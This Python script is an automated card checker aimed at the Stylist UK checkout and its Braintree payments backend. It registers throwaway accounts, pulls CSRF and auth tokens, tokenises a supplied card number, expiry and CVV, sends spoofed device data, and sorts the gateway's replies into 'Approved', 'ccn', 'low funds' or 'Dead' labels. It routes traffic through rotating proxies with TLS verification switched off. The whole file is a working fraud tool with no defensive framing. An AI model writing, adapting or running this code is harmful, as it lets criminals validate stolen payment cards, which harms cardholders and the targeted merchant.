from utilsdf.functions import random_proxy, capture, random_email
from utilsdf.woocomerce_funcs import b3_vbv
from httpx import AsyncClient


async def mai(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True, verify=False, proxies=random_proxy()
    ) as session:
        mail = random_email()
        proxy = random_proxy()

        h = {
            "authority": "i025jt1o90.execute-api.eu-west-1.amazonaws.com",
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.stylist.co.uk",
            "referer": "https://www.stylist.co.uk/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        }

        p1 = {
            "operationName": "createAccount",
            "variables": {
                "email": mail,
                "firstName": "Jeyson serrano",
                "password1": "6531423ppp@P",
                "password2": "6531423ppp@P",
            },
            "query": "mutation createAccount($firstName: String, $email: String, $password1: String, $password2: String) {\n  createAccount(\n    firstName: $firstName\n    email: $email\n    password1: $password1\n    password2: $password2\n  ) {\n    status\n    message\n    __typename\n  }\n}\n",
        }

        r = await session.post(
            "https://i025jt1o90.execute-api.eu-west-1.amazonaws.com/prod/graphql",
            headers=h,
            json=p1,
        )

        h2 = {
            "authority": "www.stylist.co.uk",
            "accept": "*/*",
            "referer": "https://www.stylist.co.uk/checkout?step=account&parentId=117&variantId=118",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        }

        r2 = await session.get(
            "https://www.stylist.co.uk/api/auth/csrf",
            headers=h2,
        )
        t2 = r2.text
        csrf = capture(t2, '{"csrfToken":"', '"}')

        h3 = {
            "authority": "www.stylist.co.uk",
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.stylist.co.uk",
            "referer": "https://www.stylist.co.uk/checkout?step=account&parentId=117&variantId=118",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        }

        params_x = ""

        d3 = {
            "redirect": "false",
            "email": mail,
            "password": "6531423ppp@P",
            "csrfToken": csrf,
            "callbackUrl": "https://www.stylist.co.uk/checkout?step=account&parentId=117&variantId=118",
            "json": "true",
        }

        r3 = await session.post(
            "https://www.stylist.co.uk/api/auth/callback/credentials",
            params=params_x,
            headers=h3,
            data=d3,
        )

        h4 = {
            "authority": "www.stylist.co.uk",
            "accept": "*/*",
            "if-none-match": '"bwc9mymkdm2"',
            "referer": "https://www.stylist.co.uk/checkout?step=account&parentId=117&variantId=118",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        }

        r4 = await session.get(
            "https://www.stylist.co.uk/api/auth/session",
            headers=h4,
        )
        t4 = r4.text
        access_token = capture(t4, 'accessToken":"', '",')

        h5 = {
            "authority": "i025jt1o90.execute-api.eu-west-1.amazonaws.com",
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.stylist.co.uk",
            "referer": "https://www.stylist.co.uk/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        }

        p5 = {
            "operationName": "QueryGetPurchases",
            "variables": {
                "authToken": access_token,
            },
            "query": "query QueryGetPurchases($authToken: String) {\n  getPurchases(authToken: $authToken) {\n    status\n    name\n    id\n    contentSubscriptionId\n    childrenSubscriptions {\n      id\n      name\n      __typename\n    }\n    __typename\n  }\n}\n",
        }

        r5 = await session.post(
            "https://i025jt1o90.execute-api.eu-west-1.amazonaws.com/prod/graphql",
            headers=h5,
            json=p5,
        )

        h6 = {
            "authority": "i025jt1o90.execute-api.eu-west-1.amazonaws.com",
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.stylist.co.uk",
            "referer": "https://www.stylist.co.uk/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        }

        p6 = {
            "operationName": "QueryGenerateToken",
            "variables": {},
            "query": "query QueryGenerateToken {\n  generateToken {\n    status\n    message\n    clientToken\n    __typename\n  }\n}\n",
        }

        r6 = await session.post(
            "https://i025jt1o90.execute-api.eu-west-1.amazonaws.com/prod/graphql",
            headers=h6,
            json=p6,
        )
        t6 = r6.text
        ey = capture(t6, 'clientToken":"', '"')
        vbv, nonce = await b3_vbv(
            ey, "www.stylist.co.uk", "35.88", cc, month, year, cvv
        )

        h7 = {
            "authority": "i025jt1o90.execute-api.eu-west-1.amazonaws.com",
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.stylist.co.uk",
            "referer": "https://www.stylist.co.uk/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        }

        p7 = {
            "operationName": "GenerateNonce",
            "variables": {
                "firstName": "Jeyson",
                "lastName": "Serrrano",
                "postcode": "10080",
                "email": mail,
                "clientNonce": nonce,
                "deviceData": '{"device_session_id":"d1e004bdac6bf37d4295e105f43dd227","fraud_merchant_id":null,"correlation_id":"37041c0a42cf0eecc6eb86c47e0a96a2"}',
            },
            "query": "mutation GenerateNonce($firstName: String, $lastName: String, $email: String, $postcode: String, $clientNonce: String, $deviceData: String) {\n  generateNonce(\n    firstName: $firstName\n    lastName: $lastName\n    email: $email\n    postcode: $postcode\n    clientNonce: $clientNonce\n    deviceData: $deviceData\n  ) {\n    status\n    message\n    nonce\n    __typename\n  }\n}\n",
        }

        r7 = await session.post(
            "https://i025jt1o90.execute-api.eu-west-1.amazonaws.com/prod/graphql",
            headers=h7,
            json=p7,
        )
        t7 = r7.text
        msg = capture(t7, '"message":"', '"')
        status_ = capture(t7, '"status":', ',"message"')

        if r7.status_code == 302 or status_ == "200":
            status = "Approved! ✅"
            msg = "Approved"
        elif msg == "Gateway Rejected: avs":
            status = "Approved! ✅ -» avs"
        elif (
            msg == "Card Issuer Declined CVV"
            or msg == "Gateway Rejected: cvv"
            or msg == "Gateway Rejected: avs_and_cvv"
        ):
            status = "Approved! ✅ -» ccn"
        elif msg == "Insufficient Funds":
            status = "Approved ✅ -» low funds"
        else:
            status = "Dead! ❌"

        return status, msg, vbv
